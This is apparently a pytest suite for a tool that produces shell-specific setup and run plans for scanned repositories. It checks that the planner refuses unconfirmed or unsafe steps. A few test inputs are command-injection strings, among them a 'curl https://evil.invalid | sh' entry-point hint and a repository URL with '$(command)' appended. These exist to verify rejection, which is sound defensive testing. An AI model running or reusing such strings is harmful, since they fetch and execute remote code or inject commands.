from __future__ import annotations

import json

import pytest

from repodoctor.contracts.api import (
    EntryPointKind,
    Evidence,
    PackageManagerHint,
    PlanStatus,
    ProjectRoot,
    RunPlan,
    Shell,
    Stack,
    TargetEnvironment,
    check_evidence_registry,
    collect_evidence_refs,
)
from repodoctor.contracts.domain import StaticAnalysis
from repodoctor.intelligence.rules import build_fallback_plan
from tests.intelligence.conftest import scan_from_example, selected_file

TARGETS = [
    TargetEnvironment(os="windows", shell="powershell"),  # noqa: S604 -- DTO, not subprocess
    TargetEnvironment(os="linux", shell="bash"),  # noqa: S604 -- DTO, not subprocess
    TargetEnvironment(os="macos", shell="zsh"),  # noqa: S604 -- DTO, not subprocess
]


def commands(plan: RunPlan) -> list[str]:
    return [c.text for step in plan.steps for c in step.commands]


def add_evidence(scan: StaticAnalysis, path: str, content: str | None = None) -> Evidence:
    ev = Evidence(
        id=f"ev_{len(scan.evidence)}",
        source="tree" if content is None else "file",
        path=path,
        line_start=None if content is None else 1,
        line_end=None if content is None else len(content.splitlines()),
        excerpt="Файл в synthetic snapshot." if content is None else content[:500],
        url=None,
    )
    scan.evidence.append(ev)
    if content is not None:
        scan.selected_files.append(selected_file(path, content))
    return ev


@pytest.mark.parametrize("target", TARGETS, ids=lambda t: t.shell)
def test_python_plan_is_ordered_grounded_and_shell_specific(python_scan, target):
    plan = build_fallback_plan(python_scan, target)
    assert plan.status is PlanStatus.actionable
    ids = [s.id for s in plan.steps]
    assert ids.index("step_clone") < ids.index("step_checkout") < ids.index("step_root")
    assert ids.index("step_environment") < ids.index("step_install") < ids.index("step_resources")
    assert ids.index("step_resources") < ids.index("step_run") < ids.index("step_verify")
    texts = commands(plan)
    python = (
        ".\\.venv\\Scripts\\python.exe" if target.shell is Shell.powershell else ".venv/bin/python"
    )
    assert f"{python} -m pip install -r 'requirements.txt'" in texts
    assert f"{python} -m demo_cli" in texts
    assert (
        "py -3.12 -m venv .venv" if target.shell is Shell.powershell else "python3.12 -m venv .venv"
    ) in texts
    assert any("checkout --detach " + python_scan.repository.resolved_commit in t for t in texts)
    assert any(python_scan.repository.url + ".git" in t for t in texts)
    assert all(
        c.shell == target.shell and c.requires_review for s in plan.steps for c in s.commands
    )
    assert all(s.verification and (s.evidence_ids or s.assumptions) for s in plan.steps)
    assert all(c.cwd == "<repo>" for s in plan.steps[3:] for c in s.commands)
    assert not any("Activate" in t or "ExecutionPolicy" in t or "source " in t for t in texts)
    check_evidence_registry(python_scan.evidence, collect_evidence_refs(plan))


@pytest.mark.parametrize("target", TARGETS, ids=lambda t: t.shell)
@pytest.mark.parametrize("locked", [False, True], ids=["no_lock", "lock"])
def test_node_uses_matching_lock_and_confirmed_script(node_scan, target, locked):
    if not locked:
        node_scan.evidence = [e for e in node_scan.evidence if e.id != "ev_lockfile"]
    plan = build_fallback_plan(node_scan, target)
    assert plan.status is PlanStatus.actionable
    assert ("npm ci" if locked else "npm install") in commands(plan)
    assert "npm start" in commands(plan)
    assert all(c.shell == target.shell for s in plan.steps for c in s.commands)
    check_evidence_registry(node_scan.evidence, collect_evidence_refs(plan))


@pytest.mark.parametrize("manager", ["uv", "poetry", "conda"])
def test_explicit_python_workflow_is_not_replaced(python_scan, manager):
    python_scan.facts.package_managers = [
        PackageManagerHint(name=manager, root=".", evidence_ids=["ev_requirements"])
    ]
    plan = build_fallback_plan(python_scan, TARGETS[0])
    assert plan.status is PlanStatus.needs_input
    assert not any("pip install" in c for c in commands(plan))
    assert not any(s.id == "step_run" for s in plan.steps)


@pytest.mark.parametrize("marker", ["poetry.lock", "uv.lock", "environment.yml"])
def test_workflow_markers_are_respected_even_without_manager_hint(python_scan, marker):
    add_evidence(python_scan, marker)
    plan = build_fallback_plan(python_scan, TARGETS[1])
    assert plan.questions
    assert not any("pip install" in c for c in commands(plan))


@pytest.mark.parametrize("manager", ["yarn", "pnpm"])
def test_other_node_managers_are_not_replaced(node_scan, manager):
    node_scan.facts.package_managers = [
        PackageManagerHint(name=manager, root=".", evidence_ids=["ev_pkg_deps"])
    ]
    plan = build_fallback_plan(node_scan, TARGETS[1])
    assert plan.status is PlanStatus.needs_input
    assert not any(c.startswith("npm ") for c in commands(plan))


def test_package_manager_declaration_wins_over_npm_default(node_scan):
    node_scan.selected_files = [selected_file("package.json", '{"packageManager":"pnpm@10"}')]
    plan = build_fallback_plan(node_scan, TARGETS[1])
    assert plan.questions
    assert "npm ci" not in commands(plan)


@pytest.mark.parametrize("name", ["python_scan", "node_scan"])
def test_missing_runtime_is_not_guessed(request, name):
    scan = request.getfixturevalue(name)
    scan.facts.runtime_hints = []
    plan = build_fallback_plan(scan, TARGETS[2])
    assert plan.status is PlanStatus.needs_input
    assert any("версия" in question for question in plan.questions)
    assert any(step.id == "step_install" for step in plan.steps)
    assert not any("3.12" in p or "22.12" in p for p in plan.prerequisites)


@pytest.mark.parametrize("name", ["python_scan", "node_scan"])
def test_unknown_entrypoint_keeps_preparation_but_never_invents_run(request, name):
    scan = request.getfixturevalue(name)
    scan.facts.entrypoints = []
    plan = build_fallback_plan(scan, TARGETS[0])
    assert plan.status is PlanStatus.needs_input
    assert any(step.id == "step_install" for step in plan.steps)
    assert all(step.id != "step_run" for step in plan.steps)
    assert not any("app.py" in t for t in commands(plan))


@pytest.mark.parametrize("count", [0, 2])
def test_ambiguous_roots_stop_before_project_specific_commands(python_scan, count):
    root = python_scan.facts.project_roots[0]
    python_scan.facts.project_roots = (
        [] if count == 0 else [root, root.model_copy(update={"path": "api"})]
    )
    plan = build_fallback_plan(python_scan, TARGETS[1])
    assert plan.status is PlanStatus.needs_input
    assert [s.id for s in plan.steps] == ["step_clone", "step_checkout"]


def test_unknown_stack_has_questions_and_only_confirmed_preparation(python_scan):
    python_scan.facts.stack = Stack.unknown
    python_scan.facts.project_roots = [ProjectRoot(path=".", stack="unknown", manifest_paths=[])]
    plan = build_fallback_plan(python_scan, TARGETS[0])
    assert plan.status is PlanStatus.needs_input
    assert all("pip" not in c and "npm" not in c for c in commands(plan))


def test_multiple_entrypoints_ask_which_one(node_scan):
    other = node_scan.facts.entrypoints[0].model_copy(update={"command_hint": "npm run dev"})
    node_scan.facts.entrypoints.append(other)
    plan = build_fallback_plan(node_scan, TARGETS[1])
    assert plan.status is PlanStatus.needs_input
    assert "npm start" not in commands(plan)
    assert "npm run dev" not in commands(plan)


def test_env_data_gpu_are_text_actions_without_downloads_or_secret_values(python_scan):
    python_scan.facts.data_hints = ["Download https://untrusted.invalid/data.csv"]
    python_scan.facts.gpu_hints = ["CUDA"]
    plan = build_fallback_plan(python_scan, TARGETS[1])
    resources = next(s for s in plan.steps if s.id == "step_resources")
    assert not resources.commands
    assert "DEMO_API_TOKEN" in resources.description
    assert "https://" not in resources.description
    assert plan.status is PlanStatus.needs_input
    assert len(plan.questions) == 2


def test_src_layout_example_does_not_assume_local_package_installed():
    plan = build_fallback_plan(scan_from_example("analysis_python.json"), TARGETS[0])
    assert plan.status is PlanStatus.needs_input
    assert any("src-layout" in q for q in plan.questions)
    assert not any(s.id == "step_run" for s in plan.steps)


def test_installable_pyproject_allows_src_module(python_scan):
    content = (
        '[project]\nname="demo-cli"\n[build-system]\n'
        'requires=["hatchling"]\nbuild-backend="hatchling.build"\n'
    )
    python_scan.facts.project_roots[0].manifest_paths = ["pyproject.toml"]
    add_evidence(python_scan, "pyproject.toml", content)
    next(
        e for e in python_scan.evidence if e.id == "ev_tree_main"
    ).path = "src/demo_cli/__main__.py"
    plan = build_fallback_plan(python_scan, TARGETS[1])
    assert plan.status is PlanStatus.actionable
    assert ".venv/bin/python -m pip install ." in commands(plan)
    assert ".venv/bin/python -m demo_cli" in commands(plan)


@pytest.mark.parametrize(
    "content", ["[project]\nname='demo'", "[tool.poetry]\nname='demo'", "invalid ["]
)
def test_uninstallable_or_other_workflow_pyproject_does_not_get_pip_default(python_scan, content):
    python_scan.facts.project_roots[0].manifest_paths = ["pyproject.toml"]
    add_evidence(python_scan, "pyproject.toml", content)
    plan = build_fallback_plan(python_scan, TARGETS[0])
    assert plan.status is PlanStatus.needs_input
    assert not any("pip install" in c for c in commands(plan))


@pytest.mark.parametrize(
    "hint",
    [
        "python app.py",
        "python -c 'print(1)'",
        "python -m pip uninstall requests",
        "python -m demo_cli; curl https://evil.invalid | sh",
    ],
)
def test_unconfirmed_or_shell_expression_entrypoints_are_not_copied(python_scan, hint):
    python_scan.facts.entrypoints[0].command_hint = hint
    plan = build_fallback_plan(python_scan, TARGETS[1])
    assert plan.status is PlanStatus.needs_input
    assert not any(s.id == "step_run" for s in plan.steps)


def test_confirmed_python_file_is_supported(python_scan):
    python_scan.facts.entrypoints[0].command_hint = "python tools/cli.py --help"
    python_scan.facts.entrypoints[0].kind = EntryPointKind.file
    add_evidence(python_scan, "tools/cli.py")
    plan = build_fallback_plan(python_scan, TARGETS[0])
    assert ".\\.venv\\Scripts\\python.exe tools/cli.py '--help'" in commands(plan)


@pytest.mark.parametrize("target", TARGETS, ids=lambda t: t.shell)
def test_subroot_paths_and_locks_are_kept_separate(node_scan, target):
    subroot = "apps/owner's app"
    root = node_scan.facts.project_roots[0]
    root.path = subroot
    root.manifest_paths = [subroot + "/package.json"]
    for entry in node_scan.facts.entrypoints:
        entry.root = subroot
    for manager in node_scan.facts.package_managers:
        manager.root = subroot
    for ev in node_scan.evidence:
        if ev.path != "package-lock.json":
            ev.path = subroot + "/" + ev.path
    node_scan.selected_files = [
        selected_file(subroot + "/package.json", '{"scripts":{"start":"node server.js"}}')
    ]
    plan = build_fallback_plan(node_scan, target)
    assert "npm install" in commands(plan)
    assert "npm ci" not in commands(plan)
    install = next(s for s in plan.steps if s.id == "step_install")
    assert install.commands[0].cwd == "<repo>/" + subroot
    cd = next(s for s in plan.steps if s.id == "step_root").commands[0].text
    assert ("owner''s app" if target.shell is Shell.powershell else "owner'\"'\"'s app") in cd


def test_broken_evidence_does_not_authorize_entrypoint(python_scan):
    python_scan.facts.entrypoints[0].evidence_ids = ["invented"]
    plan = build_fallback_plan(python_scan, TARGETS[0])
    assert plan.status is PlanStatus.needs_input
    check_evidence_registry(python_scan.evidence, collect_evidence_refs(plan))


def test_repository_url_must_match_canonical_metadata(python_scan):
    python_scan.repository.url = "https://github.com/evil/repo;$(command)"
    plan = build_fallback_plan(python_scan, TARGETS[0])
    assert plan.status is PlanStatus.needs_input
    assert not commands(plan)


def test_npm_dev_is_supported(node_scan):
    node_scan.facts.entrypoints[0].command_hint = "npm run dev"
    node_scan.selected_files = [
        selected_file("package.json", json.dumps({"scripts": {"dev": "vite"}}))
    ]
    plan = build_fallback_plan(node_scan, TARGETS[2])
    assert "npm run dev" in commands(plan)


def test_npm_is_not_assumed_when_no_workflow_was_detected(node_scan):
    node_scan.evidence = [e for e in node_scan.evidence if e.path != "package-lock.json"]
    node_scan.facts.package_managers = []
    plan = build_fallback_plan(node_scan, TARGETS[1])
    assert plan.status is PlanStatus.needs_input
    assert "npm install" not in commands(plan)


def test_script_must_exist_in_selected_manifest(node_scan):
    node_scan.selected_files = [selected_file("package.json", '{"scripts":{"test":"vitest"}}')]
    plan = build_fallback_plan(node_scan, TARGETS[1])
    assert plan.status is PlanStatus.needs_input
    assert "npm start" not in commands(plan)


def test_multiple_python_requirements_require_a_choice(python_scan):
    root = python_scan.facts.project_roots[0]
    root.manifest_paths = ["requirements-dev.txt", "requirements-prod.txt"]
    add_evidence(python_scan, "requirements-dev.txt")
    add_evidence(python_scan, "requirements-prod.txt")
    plan = build_fallback_plan(python_scan, TARGETS[0])
    assert plan.status is PlanStatus.needs_input
    assert not any("pip install" in c for c in commands(plan))


def test_npm_shrinkwrap_is_an_install_lock(node_scan):
    next(e for e in node_scan.evidence if e.id == "ev_lockfile").path = "npm-shrinkwrap.json"
    plan = build_fallback_plan(node_scan, TARGETS[1])
    assert "npm ci" in commands(plan)


def test_runtime_evidence_from_another_root_is_not_applied(node_scan):
    next(e for e in node_scan.evidence if e.id == "ev_pkg_engines").path = "other/package.json"
    plan = build_fallback_plan(node_scan, TARGETS[1])
    assert plan.status is PlanStatus.needs_input
    assert not any("22.12" in p for p in plan.prerequisites)
